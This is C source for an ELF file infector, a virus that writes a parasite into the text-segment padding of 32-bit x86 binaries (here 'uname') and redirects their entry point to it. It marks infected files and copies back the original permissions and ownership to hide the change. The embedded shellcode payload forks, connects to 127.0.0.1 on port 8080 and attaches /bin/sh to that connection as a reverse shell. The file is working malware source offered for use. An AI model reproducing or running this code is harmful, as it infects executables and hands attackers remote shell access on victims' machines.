#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>

#define PAGE_SIZE	4096



void copy_partial(int fd, int od, unsigned int len)
{
	char idata[PAGE_SIZE];
	unsigned int n = 0;
	int r;

	while (n + PAGE_SIZE < len) {
		if (read(fd, idata, PAGE_SIZE) != PAGE_SIZE) {;
			perror("read");
			exit(1);
		}

		if (write(od, idata, PAGE_SIZE) < 0) {
			perror("write");
			exit(1);
		}

		n += PAGE_SIZE;
	}

	r = read(fd, idata, len - n);
	if (r < 0) {
		perror("read");
		exit(1);
	}

	if (write(od, idata, r) < 0) {
		perror("write");
		exit(1);
	}
}

void infect_elf(char *filename, char *v, int len, int he, int e, char *special_code, int special_long)
{
	Elf32_Shdr *shdr;
	Elf32_Phdr *phdr;
	Elf32_Ehdr ehdr;
	int i;
	int offset, oshoff, pos;
	int evaddr;
	int slen, plen;
	int fd, od;
	char *sdata, *pdata;
	char *tmp_p;
	char idata[PAGE_SIZE];
	char tmpfilename[] = "infect-elf-p.tmp";
	struct stat stat;

	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

/* read the ehdr */

	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
		perror("read");
		exit(1);
	}

/* ELF checks */

	if (strncmp(ehdr.e_ident, ELFMAG, SELFMAG)) {
		fprintf(stderr, "File not ELF\n");
		exit(1);
	}

	if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) {
		fprintf(stderr, "ELF type not ET_EXEC or ET_DYN\n");
		exit(1);
	}

	if (ehdr.e_machine != EM_386) {
		fprintf(stderr, "ELF machine type not EM_386 or EM_486\n");
		exit(1);
	}

	if (ehdr.e_version != EV_CURRENT) {
		fprintf(stderr, "ELF version not current\n");
		exit(1);
	}

/* modify the parasite so that it knows the correct re-entry point */

	printf(
		"Parasite length: %i, "
		"Host entry point index: %i, "
		"Entry point offset: %i"
		"\n",
		len, he, e
	);
	printf("Host entry point: 0x%x\n", ehdr.e_entry);
	*(int *)&v[he] = ehdr.e_entry;

/* allocate memory for phdr tables */

	pdata = (char *)malloc(plen = sizeof(*phdr)*ehdr.e_phnum);
	if (pdata == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the phdr's */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, pdata, plen) != plen) {
		perror("read");
		exit(1);
	}

/*
	update the phdr's to reflect the extention of the text segment (to
	allow virus insertion)
*/

	offset = 0;

	for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
		if (offset) {
			phdr->p_offset += PAGE_SIZE;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
/* is this the text segment ? */
			int plen;

			if (phdr->p_filesz != phdr->p_memsz) {
				fprintf(
					stderr,
					"filesz = %i memsz = %i\n",
					phdr->p_filesz, phdr->p_memsz
				);
				exit(1);
			}

			evaddr = phdr->p_vaddr + phdr->p_filesz;
			plen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));

			printf("Padding length: %i\n", plen);

			if (plen < len) {
				fprintf(stderr, "Parasite too large\n");
				exit(1);
			}

			ehdr.e_entry = evaddr + e;
			printf("New entry point: 0x%x\n", ehdr.e_entry);

			offset = phdr->p_offset + phdr->p_filesz;

			printf("Parasite file offset: %i\n", offset);

			phdr->p_filesz += len;
			phdr->p_memsz += len;
		}

		++phdr;
	}

	if (offset == 0) {
		fprintf(stderr, "No text segment?");
		exit(1);
	}

//判断文件是否感染没有
//分配空间
	tmp_p = (char *)malloc(sizeof(char) * special_long+1);
	if (tmp_p == NULL)
	{
		perror("malloc");
		exit(1);
	}
	memset(tmp_p, 0, sizeof(char) * special_long+1);
	//定位到可能病毒代码插入过的地方
	if (lseek(fd, offset - special_long, SEEK_SET) < 0) 
	{
		free(tmp_p);
		perror("lseek");
		exit(1);
	}

	if (read(fd, tmp_p, special_long) != special_long) {
		free(tmp_p);
		perror("read");
		exit(1);
	}
	if (strcmp(tmp_p, special_code) == 0)
	{
		printf("this file is insfected.\n");
		free(tmp_p);
		free(pdata);
		return;
	}
	free(tmp_p);
//////////////////////////////////////////////////////////

/* allocated memory if required to accomodate the shdr tables */

	sdata = (char *)malloc(slen = sizeof(*shdr)*ehdr.e_shnum);
	if (sdata == NULL) {
		perror("malloc");
		exit(1);
	}
	if (read(fd, sdata, slen) != slen) {
		perror("read");
		exit(1);
	}

/* read the shdr's */

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, sdata, slen) != slen) {
		perror("read");
		exit(1);
	}

/* update the shdr's to reflect the insertion of the parasite */

	for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += PAGE_SIZE;
		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
/* is this the last text section ? */
			shdr->sh_size += len;
		}

                ++shdr;
        }

/* update ehdr to reflect new offsets */

	oshoff = ehdr.e_shoff;
	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

/* insert the parasite */

	if (fstat(fd, &stat) < 0) {
		perror("fstat");
		exit(1);
	}

	od = open(tmpfilename, O_WRONLY | O_CREAT | O_TRUNC, stat.st_mode);
	if (od < 0) {
		perror("write");
		exit(1);
	}


/* Reconstruct a copy of the ELF file with the parasite */

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	//写入elf 头
	if (write(od, &ehdr, sizeof(ehdr)) < 0) {
		perror("write");
		exit(1);
	}
//写入程序头部
	if (write(od, pdata, plen) < 0) {
		perror("write");
		exit(1);
	}
	free(pdata);

	if (lseek(fd, pos = sizeof(ehdr) + plen, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}
//
	copy_partial(fd, od, offset - pos);
//病毒写入
	if (write(od, v, len) < 0) {
		perror("write");
		exit(1);
	}

	memset(idata, PAGE_SIZE - len, 0);

	if (write(od, idata, PAGE_SIZE - len) < 0) {
		perror("write");
		exit(1);
	}

	copy_partial(fd, od, oshoff - offset);
//写入节表
	if (write(od, sdata, slen) < 0) {
		perror("write");
		exit(1);
	}
	free(sdata);

	if (lseek(fd, pos = oshoff + slen, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	copy_partial(fd, od, stat.st_size - pos);

/* Make the parasitic ELF the real one */

	if (rename(tmpfilename, filename) < 0) {
		perror("rename");
		exit(1);
	}

/* Make it look like thr original */

	if (fchmod(od, stat.st_mode) < 0) {
		perror("chmod");
		exit(1);
	}

	if (fchown(od, stat.st_uid, stat.st_gid) < 0) {
		perror("chown");
		exit(1);
	}

/* All done */

	printf("Infection Done\n");
}

int main(int argc, char *argv[])
{
	char special_code[] = "FUCKTHECOMPUTER";
	/*char parasite[] = "\x50\x53\x51\x52\x55\x89\xe5\x53\x83\xec\x24\x65\xa1\x14"
                          "\x00\x00\x00\x89\x45\xf4\x31\xc0\x8d\x45\xe0\xc7\x00\x48"
                          "\x65\x6c\x6c\x8d\x45\xe0\x83\xc0\x04\xc7\x00\x6f\x21\x48"
                          "\x61\x8d\x45\xe0\x83\xc0\x08\xc7\x00\x6e\x67\x6a\x21\xc6"
                          "\x45\xec\x0a\x8d\x4d\xe0\xb8\x04\x00\x00\x00\xbb\x01\x00"
                          "\x00\x00\xba\x0d\x00\x00\x00\xcd\x80\x83\xc4\x24\x5b\x5d"
                          "\x5a\x59\x5b\x58\x68\x78\x56\x34\x12\xc3"
			  "FUCKTHECOMPUTER";*/
	
	char parasite[]= 
"\x50\x53\x51\x52\x55\x89\xe5\x83\xec\x60\xb8\x02\x00\x00\x00\xcd\x80\x83\xf8\x00\x0f\x85\xff\x00\x00\x00\xc7\x44\x24\x08\x00\x00\x00\x00"
"\xc7\x44\x24\x04\x01\x00\x00\x00\xc7\x04\x24\x02\x00\x00\x00\xb8\x66\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xcd\x80\x89\x44\x24\x14\x83"
"\xf8\x00\x0f\x88\xc4\x00\x00\x00\xc7\x44\x24\x18\x10\x00\x00\x00\xc7\x44\x24\x1c\x00\x00\x00\x00\xc7\x44\x24\x20\x00\x00\x00\x00\xc7\x44"
"\x24\x24\x00\x00\x00\x00\xc7\x44\x24\x28\x00\x00\x00\x00\x66\xc7\x44\x24\x1c\x02\x00\xc7\x44\x24\x20\x7f\x00\x00\x01\x66\xc7\x44\x24\x1e"
"\x1f\x90\x8b\x44\x24\x18\x89\x44\x24\x08\x8d\x44\x24\x1c\x89\x44\x24\x04\x8b\x44\x24\x14\x89\x04\x24\xb8\x66\x00\x00\x00\xbb\x03\x00\x00"
"\x00\x89\xe1\xcd\x80\x83\xf8\x00\x78\x5c\xb9\x00\x00\x00\x00\x8b\x5c\x24\x14\xb8\x3f\x00\x00\x00\xcd\x80\xb9\x01\x00\x00\x00\x8b\x5c\x24"
"\x14\xb8\x3f\x00\x00\x00\xcd\x80\xb9\x02\x00\x00\x00\x8b\x5c\x24\x14\xb8\x3f\x00\x00\x00\xcd\x80\xc7\x45\xec\x2f\x62\x69\x6e\xc7\x45\xf0"
"\x2f\x73\x68\x00\x8d\x7d\xec\x89\x7d\xf8\xc7\x45\xfc\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xfb\x8d\x4d\xf8\xba\x00\x00\x00\x00\xcd"
"\x80\x89\xc3\xb8\x01\x00\x00\x00\xcd\x80\x83\xc4\x60\x5d\x5a\x59\x5b\x58\x68\x78\x56\x34\x12\xc3"
"FUCKTHECOMPUTER";
	int plength = 295 + strlen(special_code);
	long hentry = 290; 
	long entry = 0;

	long special_long;
	//int plength = 94 +  strlen(special_code);
	//long hentry = 89;
	char filename[] = "uname";
	special_long = strlen(special_code);
	infect_elf(filename, parasite, plength, hentry, entry,special_code,special_long);

	exit(0);
}

